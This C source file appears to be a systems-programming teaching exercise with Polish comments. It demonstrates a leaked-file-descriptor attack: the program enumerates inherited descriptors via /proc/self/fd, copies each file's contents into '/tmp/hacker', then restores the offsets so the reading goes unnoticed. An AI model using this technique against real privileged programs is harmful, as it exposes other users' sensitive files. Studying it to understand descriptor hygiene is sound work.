#include "csapp.h"

#include "csapp.h"

int main(void) {
long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  for (long fd = 3; fd < max_fd; fd++)
  {
    if(fd == out) continue;
    
    char symlink_path[14 + 19 + 1]; // napis, zawierający ścieżkę do deksryptora
    sprintf(symlink_path,"/proc/self/fd/%ld",fd); // zapisujemy ścieżkę do pliku dla danego fd
    
    // F_OK -- sprawdzamy, czy plik istnieje
    // AT_SYMLINK_NOFOLLOW -- jeśli pathname to symlink, wtedy nie robimy dereferencji, ale zwracamy informacje o symlinku
    // używamy faccessat, żeby uniknąć wyścigów, mogących powstać, gdy otwieramy pliki w innym katalogu niż obecny katalog roboczy
    if(faccessat(42, symlink_path, F_OK, AT_SYMLINK_NOFOLLOW) == -1) continue; // jeśli symlink to ścieżka absolutna, wtedy pierwszy argument jest pomijany

    char symlink_value[PATH_MAX];   // napis, przechowujący ścieżkę do pliku
    long n = Readlink(symlink_path, symlink_value, PATH_MAX); // wczytujemy ścieżkę, na którą wskazuje symlink, przechowujemy jej długość w n
    symlink_value[n] = '\0'; // kończymy napis \0 -- readlink tego nie robi

    // printf("%s, %s\n", symlink_path, symlink_value);

    // zapisuje do deskryptora pliku
    dprintf(out, "\nFile descriptor %ld is '%s' file!\n", fd, symlink_value); // do pliku out zapisujemy podany napis 


    // zaczynamy przepisywać zawartość pliku do out
    off_t offset;
    if((offset = lseek(fd, 0, SEEK_CUR)) == -1) continue; // sprawdzamy, czy plik nie jest pusty (lseek zwróci wtedy offset - 1 = -1)
    // SEEK_CUR ustawia file offset na jego obecną pozycję + offset z argumentu, u nas 0 -- nie zmieniamy położenia kursora
    // offset zawiera teraz offset od początku pliku mierzony w bajtach
    Lseek(fd, 0, SEEK_SET); // SEEK_SET ustawia kursor na offset bajtów, u nas na 0 bajtów -- początek pliku

    char buf[BUFSIZ];
    size_t count = Read(fd, buf, BUFSIZ); // czytamy do buf co najwyżej BUFSIZE bajtow z fd

    while (count > 0) // dopóki nie odczytamy 0 bajtów (koniec pliku), 
    {
      Write(out, buf, count); // zapisuje do pliku out co najwyżej count bajtów z buf
      count = Read(fd, buf, BUFSIZ); // czytamy do buf co najwyżej BUFSIZE bajtow z fd
    }
    
    Lseek(fd, offset, SEEK_SET); // przywracamy offset pliku na zapisany w zmiennej offset
  }
}